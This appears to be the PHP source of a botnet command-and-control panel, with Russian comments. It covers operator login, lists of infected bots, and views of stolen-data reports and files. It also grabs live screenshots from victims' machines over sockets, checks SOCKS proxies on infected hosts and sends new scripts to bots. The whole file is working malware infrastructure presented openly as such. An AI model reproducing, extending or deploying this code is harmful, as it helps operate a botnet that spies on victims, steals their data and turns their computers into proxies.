<?php define('__CP__', 1);
require_once('system/global.php');
if(!@include_once('system/config.php'))die('Hello! How are you?');

///////////////////////////////////////////////////////////////////////////////
// Константы.
///////////////////////////////////////////////////////////////////////////////

define('CURRENT_TIME',     time());                            //Текущее время.
define('ONLINE_TIME_MIN',  (CURRENT_TIME - BOTNET_TIMEOUT));   //Минимальное время для статуса "Онлайн".
define('DEFAULT_LANGUAGE', 'en');                              //Язык по умолчанию.
define('THEME_PATH',       'theme');                           //Папка для темы.

//HTTP запросы.
define('QUERY_SCRIPT',            basename($_SERVER['PHP_SELF']));
define('QUERY_SCRIPT_HTML',       QUERY_SCRIPT);
define('QUERY_VAR_MODULE',        'm');                     //Переменая указывающая на текущий модуль.
define('QUERY_STRING_BLANK',      QUERY_SCRIPT.'?m=');      //Пустая строка запроса.
define('QUERY_STRING_BLANK_HTML', QUERY_SCRIPT_HTML.'?m='); //Пустая строка запроса в HTML.
define('CP_HTTP_ROOT',            str_replace('\\', '/', (!empty($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : '/'))); //Корень CP.

//Сессия, куки.
define('COOKIE_USER',      'p');                    //Имя пользователя в куках.
define('COOKIE_PASS',      'u');                    //Пароль пользователя в куках.
define('COOKIE_LIVETIME',  CURRENT_TIME + 2592000); //Время жизни куков.
define('COOKIE_SESSION',   'ref');                  //Переменная для хранения сессии.
define('SESSION_LIVETIME', CURRENT_TIME + 1300);    //Время жизни сессии.

///////////////////////////////////////////////////////////////////////////////
// Инициализация.
///////////////////////////////////////////////////////////////////////////////

//Подключаемся к базе.
if(!ConnectToDB())die(mysql_error_ex());

//Подключаем тему.
require_once(THEME_PATH.'/index.php');

//Управление логином.
if(!empty($_GET[QUERY_VAR_MODULE]))
{
  //Форма логина.
  if(strcmp($_GET[QUERY_VAR_MODULE], 'login') === 0)
  {
    UnlockSessionAndDestroyAllCokies();
    
    if(isset($_POST['user']) && isset($_POST['pass']))
    {
      $user = $_POST['user'];
      $pass = md5($_POST['pass']);
    
      //Проверяем логин.
      if(@mysql_query("SELECT id FROM cp_users WHERE name='".addslashes($user)."' AND pass='".addslashes($pass)."' AND flag_enabled='1' LIMIT 1") && @mysql_affected_rows() == 1)
      {
        if(isset($_POST['remember']) && $_POST['remember'] == 1)
        {
          setcookie(COOKIE_USER, md5($user), COOKIE_LIVETIME, CP_HTTP_ROOT);
          setcookie(COOKIE_PASS, $pass,      COOKIE_LIVETIME, CP_HTTP_ROOT);
        }
    
        LockSession();
        $_SESSION['name'] = $user;
        $_SESSION['pass'] = $pass;
        //UnlockSession();
      
        header('Location: '.QUERY_STRING_BLANK.'home');
      }
      else ShowLoginForm(true);
      die();
    }
    
    ShowLoginForm(false);
    die();
  }
  
  //Выход
  if(strcmp($_GET['m'], 'logout') === 0)
  {
    UnlockSessionAndDestroyAllCokies();
    header('Location: '.QUERY_STRING_BLANK.'login');
    die();
  }
}

///////////////////////////////////////////////////////////////////////////////
// Проверка данных логина.
///////////////////////////////////////////////////////////////////////////////

$logined = 0; //Флаг означающий, залогинины ли мы.

//Логин через сессию.
LockSession();
if(!empty($_SESSION['name']) && !empty($_SESSION['pass']))
{
  if(($r = @mysql_query("SELECT * FROM cp_users WHERE name='".addslashes($_SESSION['name'])."' AND pass='".addslashes($_SESSION['pass'])."' AND flag_enabled='1' LIMIT 1")))$logined = @mysql_affected_rows();
}
//Логин через куки.
if($logined !== 1 && !empty($_COOKIE[COOKIE_USER]) && !empty($_COOKIE[COOKIE_PASS]))
{
  if(($r = @mysql_query("SELECT * FROM cp_users WHERE MD5(name)='".addslashes($_COOKIE[COOKIE_USER])."' AND pass='".addslashes($_COOKIE[COOKIE_PASS])."' AND flag_enabled='1' LIMIT 1")))$logined = @mysql_affected_rows();
}
//Не удалось залогиниться.
if($logined !== 1)
{
  UnlockSessionAndDestroyAllCokies();
  header('Location: '.QUERY_STRING_BLANK.'login');
  die();
}

//Получаем данные пользователя.
$_USER_DATA = @mysql_fetch_assoc($r);
if($_USER_DATA === false)die(mysql_error_ex());
$_SESSION['name'] = $_USER_DATA['name'];
$_SESSION['pass'] = $_USER_DATA['pass'];

//Подключаем язык.
if(@strlen($_USER_DATA['language']) != 2 || !SafePath($_USER_DATA['language']) || !file_exists('system/lng.'.$_USER_DATA['language'].'.php'))$_USER_DATA['language'] = DEFAULT_LANGUAGE;
require_once('system/lng.'.$_USER_DATA['language'].'.php'); 

UnlockSession();

///////////////////////////////////////////////////////////////////////////////
// Определяем меню.
///////////////////////////////////////////////////////////////////////////////

//Главное меню.
$_MAINMENU = array(      //Модуль.             //Название.               //Необходимые права.
                   array(0,                    LNG_MM_STATS,             array()),
                   array('stats_main',         LNG_MM_STATS_MAIN,        array('r_stats_main')),
                   array('stats_os',           LNG_MM_STATS_OS,          array('r_stats_os')),

                   array(0,                    LNG_MM_BOTNET,            array()),
                   array('botnet_bots',        LNG_MM_BOTNET_BOTS,       array('r_botnet_bots')),
                   array('botnet_scripts',     LNG_MM_BOTNET_SCRIPTS,    array('r_botnet_scripts')),
                   
                   array(0,                    LNG_MM_REPORTS,           array()),
                   array('reports_db',         LNG_MM_REPORTS_DB,        array('r_reports_db')),
                   array('reports_files',      LNG_MM_REPORTS_FILES,     array('r_reports_files')),
                   
                   array(0,                    LNG_MM_SYSTEM,            array()),
                   array('sys_info',           LNG_MM_SYSTEM_INFO,       array('r_system_info')),
                   array('sys_options',        LNG_MM_SYSTEM_OPTIONS,    array('r_system_options')),
                   array('sys_user',           LNG_MM_SYSTEM_USER,       array('r_system_user')),
                   array('sys_users',          LNG_MM_SYSTEM_USERS,      array('r_system_users'))
                  );

//Меню дейтвий над ботом. Также применяется для массива ботов.
$_BOT_MENU = array(
                   array('fullinfo',        LNG_MBA_FULLINFO,         array('r_botnet_bots')),
                   array('fullinfoss',      LNG_MBA_FULLINFOSS,       array('r_botnet_bots')),
                   
                   array(0,                 LNG_MBA_SEPARATOR,        array()),
                   array('today_dbreports', LNG_MBA_TODAY_DBREPORTS,  array('r_reports_db')),
                   array('week_dbreports',  LNG_MBA_WEEK_DBREPORTS,   array('r_reports_db')),
                   array('files',           LNG_MBA_FILES,            array('r_reports_files')),
                   
                   array(0,                 LNG_MBA_SEPARATOR,        array()),
                   array('remove',          LNG_MBA_REMOVE,           array('r_edit_bots')),
                   array('removeex',        LNG_MBA_REMOVE_REPORTS,   array('r_edit_bots', 'r_reports_db_edit', 'r_reports_files_edit')),
                   
                   array(0,                 LNG_MBA_SEPARATOR,        array()),
                   array('port_socks',      LNG_MBA_PORT_SOCKS,       array('r_botnet_bots')),
                   array('newscript',       LNG_MBA_NEWSCRIPT,        array('r_botnet_scripts_edit'))
                  );

OptimizeMenu($_BOT_MENU, false);

///////////////////////////////////////////////////////////////////////////////
// Обработка группы ботов.
///////////////////////////////////////////////////////////////////////////////

if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_POST['bots']) && is_array($_POST['bots'])) || (!empty($_GET['bots']) && is_array($_GET['bots']))))
{
  $bedit  = empty($_USER_DATA['r_edit_bots']) ? 0 : 1;
  $ba     = !empty($_GET['botsaction']) ? $_GET['botsaction'] : $_POST['botsaction'];
  $blist  = !empty($_POST['bots']) && is_array($_POST['bots']) ? $_POST['bots'] : $_GET['bots'];
  $blist  = array_unique($blist);
  
  //Проверям есть ли право на действие.
  $deny = true;
  foreach($_BOT_MENU as $item)if($item[0] !== 0 && strcmp($item[0], $ba) === 0){$deny = false; break;}
  if($deny)ThemeFatalError(LNG_ACCESS_DEFINED);
  
  //Составляем список ботов для MySQL.
  $sql_blist = '';
  $count = 0;
  foreach($blist as $bot)$sql_blist .= ($count++ == 0 ? '' : ' OR ')."bot_id='".addslashes($bot)."'";

  if(strcmp($ba, 'fullinfo') === 0 || strcmp($ba, 'fullinfoss') === 0)
  {
    //Режим обнавления.
    if($bedit && isset($_GET['save']) && (isset($_POST['used']) && is_array($_POST['used'])) && (isset($_POST['comments']) && is_array($_POST['comments'])))
    {
      $q = '';
      foreach($blist as $i => $bot)if(isset($_POST['used'][$i]) && isset($_POST['comments'][$i]))
      {
        @mysql_query("UPDATE botnet_list SET flag_used='".($_POST['used'][$i] == 1 ? 1 : 0)."', comments='".addslashes(substr($_POST['comments'][$i], 0, 250))."' WHERE bot_id='".addslashes($bot)."' LIMIT 1");
        $q .= '&bots[]='.urlencode($bot);
      }
    
      header('Location: '.QUERY_SCRIPT.'?botsaction='.urlencode($ba).$q);
      die();
    }
    
    //Скриншот.
    if(strcmp($ba, 'fullinfoss') === 0 && isset($_GET['ipv4']) && isset($_GET['port']))
    {
      $format = 'image/'.$_USER_DATA['ss_format'];
      $data = 0;
      
      if(($sock = @fsockopen($_GET['ipv4'], $_GET['port'], $errn, $errs, 5)))
      {
        @stream_set_timeout($sock, 5);
        @fwrite($sock, pack('LLL', 10, strlen($format) + 4, $_USER_DATA['ss_quality']).$format);
        @fflush($sock);
     
        if(($fs = @fread($sock, 8)) && ($fs = @unpack('L2', $fs)))
        {
          while($data < $fs[1] && !@feof($sock))
          {
            $need = min($fs[2], $fs[1] - $data);
            if(!($td = @fread($sock,$need)))break;
            $sm = strlen($td);
            while($sm < $need && !@feof($sock) && ($td2 = @fread($sock,$need-$sm))){$sm += strlen($td2); $td .= $td2;}
            if($data == 0)header('Content-Type: '.$format);
            $data += $sm;
            echo $td;
            if(!@fwrite($sock, pack('L', $fs[2])))break;
            @fflush($sock);
          }
        }
        @fclose($sock);
      }
      
      if($data === 0)
      {
        header('Content-Type: image/png');
        echo file_get_contents(THEME_PATH.'/failed.png');
      }
      die();
    }
    
    //Стандартный вывод.
    if(!($r = @mysql_query('SELECT *, IF(rtime_last>=\''.ONLINE_TIME_MIN.'\', 1, 0) AS is_online FROM botnet_list WHERE '.$sql_blist)))ThemeMySQLError();
    
    //Получаем результат.
    $res = array();
    while(($m = @mysql_fetch_assoc($r)))$res[$m['bot_id']] = $m;
    mysql_free_result($r);
    unset($m);
    
    //Выводим результат.
    $e_count = 0;
    $data = '';
    if($bedit)$data .= str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('edit', QUERY_SCRIPT_HTML.'?botsaction='.$ba.'&amp;save=1', ''), THEME_FORMPOST_BEGIN);
    $data .=
    str_replace('{WIDTH}', '90%', THEME_DIALOG_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_BA_FULLINFO_TITLE), THEME_DIALOG_TITLE).
     THEME_DIALOG_ROW_BEGIN.
       str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN);
    
    foreach($blist as $bot)
    {
      $data .=
      str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_BOTID),         THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', BotPopupMenu($bot, 'botmenu')), THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END;
      
      //Базовая информация.
      $is_exists = isset($res[$bot]);
      if(!$is_exists)$data .= THEME_LIST_ROW_BEGIN.str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BA_FULLINFO_EMPTY), THEME_LIST_ITEM_EMPTY_1).THEME_LIST_ROW_END;
      else
      {
        $e_count++;
        $l = $res[$bot];
        $data .= 
        THEME_LIST_ROW_BEGIN.          
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_BOTNET),                                                                        THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($l['botnet'])),                                                                 THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_VERSION),                                                                       THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', IntToVersion($l['bot_version'])),                                                               THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_OS),                                                                            THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', OSDataToString($l['os_version'])),                                                              THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_OSLANG),                                                                        THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($l['language_id'])),                                                            THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TIMEBIAS),                                                                      THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', TimeBiasToText($l['time_localbias'])),                                                          THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_COUNTRY),                                                                       THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($l['country'])),                                                                THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.         
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_IPV4),                                                                          THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($l['ipv4']).($l['flag_nat'] ? '*' : '')),                                       THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_LATENCY),                                                                       THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', number_format_as_float($l['net_latency'] / 1000, 3)),                                           THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_PORT_S1),                                                                       THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($l['port_s1'])),                                                                THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TFIRST),                                                                        THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex(gmdate(LNG_FORMAT_DT, $l['rtime_first']))),                                     THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TLAST),                                                                         THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex(gmdate(LNG_FORMAT_DT, $l['rtime_last']))),                                      THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_TONLINE),                                                                       THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['is_online'] == 1 ? TickCountToTime(CURRENT_TIME - $l['rtime_online']) : LNG_FORMAT_NOTIME), THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_INSTALL),                                                                       THEME_LIST_ITEM_LTEXT_U2).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['flag_install'] == 1 ? LNG_YES : LNG_NO),                                                    THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_USED),                                                                          THEME_LIST_ITEM_LTEXT_U1).
          ($bedit
          ?
            str_replace(array('{NAME}', '{WIDTH}'), array('used[]', 'auto'),                                                                                    THEME_LIST_ITEM_LISTBOX_U1_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_NO),  $l['flag_used'] != 1 ? THEME_LIST_ITEM_LISTBOX_ITEM_CUR : THEME_LIST_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_YES), $l['flag_used'] == 1 ? THEME_LIST_ITEM_LISTBOX_ITEM_CUR : THEME_LIST_ITEM_LISTBOX_ITEM).
            (                                                                                                                                                   THEME_LIST_ITEM_LISTBOX_U1_END)
          :
            str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['flag_used'] == 1 ? LNG_YES : LNG_NO),                                                     THEME_LIST_ITEM_LTEXT_U1)
          ).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_COMMENTS),                                                                      THEME_LIST_ITEM_LTEXT_U2).
          ($bedit
          ?
            str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('comments[]', htmlentities_ex($l['comments']), 250, '99%'),                    THEME_LIST_ITEM_INPUT_TEXT_U2)
          :
            str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($l['comments']) ? '-' : htmlentities_ex($l['comments'])),                               THEME_LIST_ITEM_LTEXT_U2)
          ).
        THEME_LIST_ROW_END;
        
        if(strcmp($ba, 'fullinfoss') === 0)
        {
          $ss = str_replace('{URL}', 
                            htmlentities_ex(QUERY_SCRIPT.'?botsaction=fullinfoss&bots[]=0&ipv4='.urlencode($l['ipv4']).'&port='.urlencode($l['port_s1'])),
                            THEME_SCREENSHOT);

          $data .= 
          THEME_LIST_ROW_BEGIN.
            str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_SCREENSHOT),                                                                  THEME_LIST_ITEM_LTEXT_U1).
            str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $ss),                                                                                         THEME_LIST_ITEM_LTEXT_U1).
          THEME_LIST_ROW_END;
        }
      }
      
      //Концовка.
      $data .= 
      THEME_LIST_END.
      ($bedit && $is_exists ? str_replace(array('{NAME}', '{VALUE}'), array('bots[]', htmlentities_ex($bot)), THEME_FORM_VALUE) : '').
      THEME_VSPACE;
    }
    
    $data .=
    THEME_DIALOG_ITEM_CHILD_END.
    THEME_DIALOG_ROW_END;

    if($bedit && $e_count > 0)
    {
      $data .=
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ACTIONLIST_BEGIN).
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BA_FULLINFO_ACTION_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
      THEME_DIALOG_ACTIONLIST_END;
    }
    
    $data .=
    THEME_DIALOG_END.
    ($bedit ? THEME_FORMPOST_END : '');
    
    ThemeSmall(LNG_BA_FULLINFO_TITLE, $data, 0, GetBotJSMenu('botmenu'), 0);
  }
  else if(strcmp($ba, 'today_dbreports') === 0 || strcmp($ba, 'week_dbreports') === 0)
  {
    $date2 = gmdate('ymd', CURRENT_TIME);    
    $date1 = strcmp($ba, 'week_dbreports') === 0 ? gmdate('ymd', CURRENT_TIME - 518400) : $date2;
    
    foreach($blist as $k => $v)if(spacechars_exists($v))$blist[$k] = '"'.$v.'"';
    header('Location: '.QUERY_STRING_BLANK.'reports_db&date1='.urlencode($date1).'&date2='.urlencode($date2).'&bots='.urlencode(implode(' ', $blist)).'&q=');
    die();
  }
  else if(strcmp($ba, 'files') === 0)
  {
    foreach($blist as $k => $v)if(spacechars_exists($v))$blist[$k] = '"'.$v.'"';
    header('Location: '.QUERY_STRING_BLANK.'reports_files&bots='.urlencode(implode(' ', $blist)).'&q=');
    die();
  }
  else if(strcmp($ba, 'remove') === 0 || strcmp($ba, 'removeex') === 0) //Проверка прав не требуется, т.к. проверка присходит при формировании $_BOT_MENU.
  {
    if(isset($_GET['yes']) || isset($_GET['no']))
    {
      $data =
      str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BA_REMOVE_TITLE), THEME_LIST_TITLE);
      
      if(isset($_GET['yes']))
      {
        //Удаление из botnet_list.
        if(@mysql_query('DELETE FROM botnet_list WHERE '.$sql_blist))$t = str_replace('{TEXT}', sprintf(LNG_BA_REMOVE_REMOVED, @mysql_affected_rows()), THEME_STRING_SUCCESS);
        else                                                         $t = str_replace('{TEXT}', mysql_error_ex(),                                       THEME_STRING_ERROR);
        
        $data .=
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', 'botnet_list'), THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END;
        
        //Удаление.
        if(strcmp($ba, 'removeex') === 0)
        {
          $i = 1;
          $rlist = ListReportTables(MYSQL_DB);
          
          //Удаление из botnet_reports_*.
          foreach($rlist as $table)
          {
            if(@mysql_query("DELETE FROM {$table} WHERE ".$sql_blist))$t = str_replace('{TEXT}', sprintf(LNG_BA_REMOVE_REMOVED, @mysql_affected_rows()), THEME_STRING_SUCCESS);
            else                                                      $t = str_replace('{TEXT}', mysql_error_ex(),                                       THEME_STRING_ERROR);
            
            $item = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);

            $data .=
            THEME_LIST_ROW_BEGIN.
              str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($table)), $item).
              str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), $item).
            THEME_LIST_ROW_END;
            
            $i++;
          }
          
          //Удаление файлов.
          $root = getdirs(REPORTS_PATH);
          if($root !== false)foreach($root as $rdir)
          {
            $rdir = REPORTS_PATH.'/'.$rdir;
            $botnets = getdirs($rdir);
            
            if($botnets !== false)foreach($botnets as $botnet)
            {
              $botnet = $rdir.'/'.$botnet;
              $bots = getdirs($botnet);

              if($bots !== false)foreach($bots as $bot)
              {
                $bot_l = mb_strtolower(urldecode($bot));
                $bot = $botnet.'/'.$bot;
                
                foreach($blist as $l)
                {
                  if(strcmp($bot_l, mb_strtolower($l)) === 0)
                  {
                    if(ClearPath($bot))$t = str_replace('{TEXT}', LNG_BA_REMOVE_FREMOVED, THEME_STRING_SUCCESS);
                    else               $t = str_replace('{TEXT}', LNG_BA_REMOVE_FERROR,   THEME_STRING_ERROR);
                    
                    $item = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);

                    $data .=
                    THEME_LIST_ROW_BEGIN.
                      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($bot)), $item).
                      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), $item).
                    THEME_LIST_ROW_END;
            
                    $i++;
                  }
                }
              }
              unset($bots);
            }
            unset($botnets);
          }
          unset($root);
        }
      }
      else $data .= THEME_LIST_ROW_BEGIN.str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_BA_REMOVE_ABORTED), THEME_LIST_ITEM_LTEXT_U1).THEME_LIST_ROW_END;
      
      ThemeSmall(LNG_BA_REMOVE_TITLE, $data.THEME_LIST_END, 0, 0, 0); 
    }
    else
    {
      $bl = '';
      foreach($blist as $bot)$bl .= '&bots[]='.addjsslashes(urlencode($bot));
      
      $q = sprintf(strcmp($ba, 'remove') === 0 ? LNG_BA_REMOVE_Q1 : LNG_BA_REMOVE_Q2, count($blist));
      $js = "function qr(){var r = confirm('".addjsslashes($q)."') ? 'yes': 'no'; window.location='".addjsslashes(QUERY_SCRIPT)."?botsaction={$ba}{$bl}&' + r;}";
      ThemeSmall(LNG_BA_REMOVE_TITLE, '', $js, 0, ' onload="qr()"'); 
    }
  }
  else if(strcmp($ba, 'port_socks') === 0)
  {
    //Проверка сокса.
    if(isset($_GET['ipv4']) && isset($_GET['port']))
    {
      $ok = 0;
      if(($s = @fsockopen($_GET['ipv4'], $_GET['port'], $errn, $errs, 5)))
      {
        @stream_set_timeout($s, 5);
        $data = pack('CCSL', 4, 1, 0, 0)."\0"; //Заголовок Socks4.
        if(@fwrite($s, $data) && ($data = @fread($s, 8)) && strlen($data) == 8)$ok = 1;
        fclose($s);
      }
      
      if($ok == 1)echo str_replace('{TEXT}', LNG_BA_PORT_SOCKS_SUCCESS, THEME_STRING_SUCCESS);
      else        echo str_replace('{TEXT}', LNG_BA_PORT_SOCKS_FAILED,  THEME_STRING_ERROR);
      
      die();
    }
    
    //Вывод списка.
    if(!($r = @mysql_query('SELECT bot_id, country, ipv4, port_s1 FROM botnet_list WHERE '.$sql_blist)))ThemeMySQLError();
    
    //Получаем результат.
    $res = array();
    while(($m = @mysql_fetch_row($r)))$res[$m[0]] = $m;
    mysql_free_result($r);
    unset($m);
    
    $data =
    str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(3, LNG_BA_PORT_SOCKS_TITLE), THEME_LIST_TITLE);
        
    $i = 0;
    $jslist = '';
    
    //Выводим результат.
    foreach($blist as $bot)
    {
      $is_exists = isset($res[$bot]);
      $item = ((($i++) % 2 == 0) ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2);
      
      if($is_exists)
      {
        $l = $res[$bot];
        $jslist .= ($jslist == '' ? '' : ', ')."['st{$i}', '".addjsslashes(urlencode($l[2]))."', '".addjsslashes(urlencode($l[3]))."']";
      }
      
      $data .=
      THEME_LIST_ROW_BEGIN.
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', BotPopupMenu($bot, 'botmenu').'&#160;/&#160;'.($is_exists ? $l[1] : '--')), $item).
        str_replace(array('{WIDTH}', '{TEXT}'), array('150px', $is_exists ? htmlentities_ex($l[2].':'.$l[3]) : '-:-'), $item).
        str_replace(array('{WIDTH}', '{TEXT}'), array('150px',
                                                      $is_exists ? 
                                                      str_replace('{ID}', 'st'.$i, THEME_STRING_ID_BEGIN).LNG_BA_PORT_SOCKS_CHECKING.THEME_STRING_ID_END :
                                                      LNG_BA_PORT_SOCKS_FAILED
                                                     ), $item).
      THEME_LIST_ROW_END;
    }
    
    //Скрипт для проверки соксов.
    $ajax_err  = addjsslashes(str_replace('{TEXT}', LNG_BA_PORT_SOCKS_ERROR, THEME_STRING_ERROR));
    $ajax_init = JSXMLHttpRequest('sockshttp');
    $q         = addjsslashes(QUERY_SCRIPT.'?botsaction=port_socks&bots[]=0');
    $ajax      =
<<<JS_SCRIPT
var sockslist = [{$jslist}];
var sockshttp = false;

function StateChange(i){if(sockshttp.readyState == 4)
{
  var el = document.getElementById(sockslist[i][0]);
  if(sockshttp.status == 200 && sockshttp.responseText.length > 5)el.innerHTML = sockshttp.responseText;
  else el.innerHTML = '{$ajax_err}';
  SocksCheck(++i);
}}

function SocksCheck(i)
{
  if(sockshttp)delete sockshttp;
  if(i < sockslist.length)
  {
    {$ajax_init}
    if(sockshttp)
    {
      sockshttp.onreadystatechange = function(){StateChange(i)};
      sockshttp.open('GET', '{$q}&ipv4=' + sockslist[i][1] + '&port=' + sockslist[i][2], true);
      sockshttp.send(null);
    }
  }
}
JS_SCRIPT;
    
    ThemeSmall(LNG_BA_PORT_SOCKS_TITLE, $data.THEME_LIST_END, $ajax, GetBotJSMenu('botmenu'), ' onload="SocksCheck(0);"');
  }
  else if(strcmp($ba, 'newscript') === 0)
  {
    foreach($blist as $k => $v)if(spacechars_exists($v))$blist[$k] = '"'.$v.'"';
    header('Location: '.QUERY_STRING_BLANK.'botnet_scripts&new=-1&bots='.urlencode(implode(' ', $blist)));
    die();
  }
  
  die();
}

///////////////////////////////////////////////////////////////////////////////
// Запуск модуля.
///////////////////////////////////////////////////////////////////////////////
                            
//Выбор имени модуля и удаление лишних пунктов меню.
$needed_module = (empty($_GET[QUERY_VAR_MODULE]) ? '' : $_GET[QUERY_VAR_MODULE]);
$curmodule     =  '';

OptimizeMenu($_MAINMENU, true);
foreach($_MAINMENU as $key => $item)if($item[0] !== 0 && (strcmp($needed_module, $item[0]) === 0 || $curmodule == ''))$curmodule = $item[0];
if($curmodule == '')die('Modules for current user not defined.');

define('CURRENT_MODULE',      $curmodule);                             //Текущий модуль.
define('FORM_CURRENT_MODULE', str_replace(array('{NAME}', '{VALUE}'), array('m', $curmodule), THEME_FORM_VALUE)); //Параметр текущего модуля для формы.
define('QUERY_STRING',        QUERY_STRING_BLANK.CURRENT_MODULE);      //Строка запроса для текущего модуля.
define('QUERY_STRING_HTML',   QUERY_STRING_BLANK_HTML.CURRENT_MODULE); //Строка запроса для текущего модуля в HTML формате.
unset($needed_module, $curmodule);

//Загрузка языка модуля.
